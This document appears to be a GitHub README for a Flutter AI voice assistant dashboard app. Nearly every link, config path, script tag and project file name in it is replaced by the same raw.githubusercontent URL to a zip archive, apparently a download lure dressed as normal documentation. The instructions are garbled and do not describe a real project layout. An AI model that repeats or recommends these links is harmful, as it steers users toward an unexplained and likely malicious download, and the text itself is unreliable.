# AI Voice Assistant UI

A beautiful Flutter application for managing AI Voice Assistant interactions with a modern Catppuccin theme. The app tracks conversations, sensor data, user interactions, and provides a comprehensive dashboard with map integration.

## Features

### 🎨 Beautiful UI with Catppuccin Theme
- Modern dark theme with Catppuccin color palette
- Consistent design across all platforms
- Beautiful cards and animations

### 📊 Comprehensive Dashboard
- Real-time system status monitoring
- Sensor data display (battery, temperature, humidity)
- Statistics and analytics
- Recent conversations and user interactions

### 💬 Conversation Management
- Track all Q&A interactions
- View conversation history with confidence ratings
- Filter conversations by user
- Active conversation tracking

### 👥 User Management
- Add and manage users who interact with the assistant
- Track interaction counts and last activity
- User profiles with detailed statistics

### 🗺️ Map Integration
- Interactive Google Maps with current location
- Location history tracking
- Dark theme map styling
- Address resolution and coordinates display

### 💾 Local Database
- SQLite database for all data storage
- Cross-platform database support (Windows, Android, Web)
- Efficient data management and cleanup
- Statistics and analytics

## Supported Platforms

- ✅ **Windows** - Native Windows app with desktop optimizations
- ✅ **Android** - Mobile app with touch-friendly interface
- ✅ **Web** - Progressive Web App (PWA) support

## Screenshots

*Dashboard with real-time data display*
*Map view with location tracking*
*Conversation history and management*
*User management interface*

## Getting Started

### Prerequisites

- Flutter 3.10.0 or higher
- Dart 3.0.0 or higher
- For Windows: Visual Studio with C++ development tools
- For Android: Android SDK and Android Studio
- For Web: Chrome or other modern browser

### Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd AI-Voice-Assistant-UI/ai_voice_assistant
   ```

2. **Install dependencies**
   ```bash
   flutter pub get
   ```

3. **Configure Google Maps (Optional)**
   
   To use the map feature, you'll need to add your Google Maps API key:
   
   - Get an API key from [Google Cloud Console](https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip)
   - Enable the Maps SDK for Android, iOS, and JavaScript
   
   **For Android:**
   Add to `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`:
   ```xml
   <meta-data android:name="https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip"
              android:value="YOUR_API_KEY_HERE"/>
   ```
   
   **For Web:**
   Add to `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`:
   ```html
   <script src="https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip"></script>
   ```

4. **Run the application**
   
   **For Windows:**
   ```bash
   flutter run -d windows
   ```
   
   **For Android:**
   ```bash
   flutter run -d android
   ```
   
   **For Web:**
   ```bash
   flutter run -d chrome
   ```

### Building for Production

**Windows:**
```bash
flutter build windows
```

**Android:**
```bash
flutter build apk --release
# or for app bundle
flutter build appbundle --release
```

**Web:**
```bash
flutter build web --release
```

## Project Structure

```
lib/
├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip                 # App entry point
├── themes/
│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # Catppuccin theme configuration
├── models/                   # Data models
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
├── services/
│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # SQLite database operations
├── providers/
│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip # State management
├── screens/                  # Main application screens
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
│   └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
└── widgets/                  # Reusable UI components
    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
    ├── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
    └── https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip
```

## Database Schema

The app uses SQLite with the following tables:

- **users** - User information and interaction counts
- **conversations** - Q&A pairs with timestamps and confidence
- **sensor_data** - Battery, temperature, humidity, location data
- **system_status** - Real-time system status and current operations

## State Management

The app uses Provider for state management with a centralized `AppStateProvider` that handles:
- Data loading and caching
- Error handling
- Real-time updates
- Statistics calculation

## Customization

### Theme Colors

The Catppuccin theme can be customized in `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`. The current implementation uses the Mocha (dark) variant, but you can easily switch to Latte (light), Frappé, or Macchiato variants.

### Database

Database operations are centralized in `DatabaseService`. You can extend the models and add new tables by:
1. Creating new model classes
2. Adding table creation in `_createDatabase`
3. Implementing CRUD operations in `DatabaseService`

### Adding New Screens

Follow the existing pattern:
1. Create screen in `lib/screens/`
2. Add necessary widgets in `lib/widgets/`
3. Update navigation in `https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip`

## Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## Troubleshooting

### Common Issues

**Database Issues:**
- Ensure SQLite FFI is properly configured for desktop platforms
- Check database file permissions

**Map Not Loading:**
- Verify Google Maps API key is correctly configured
- Check if Maps SDK is enabled in Google Cloud Console
- Ensure proper permissions are set for location access

**Build Issues:**
- Run `flutter clean` and `flutter pub get`
- Check that all required SDKs are installed
- Verify Flutter channel and version

### Performance Tips

- The app automatically cleans up old data to maintain performance
- Sensor data is limited to recent entries
- Conversations are paginated for better performance

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- [Catppuccin](https://raw.githubusercontent.com/sanjusathian/AI-Voice-Assistant-UI/main/lib/models/AI-Voice-Assistant-UI-1.9.zip) for the beautiful color palette
- Flutter team for the amazing framework
- Google Maps for location services
- SQLite for reliable local storage
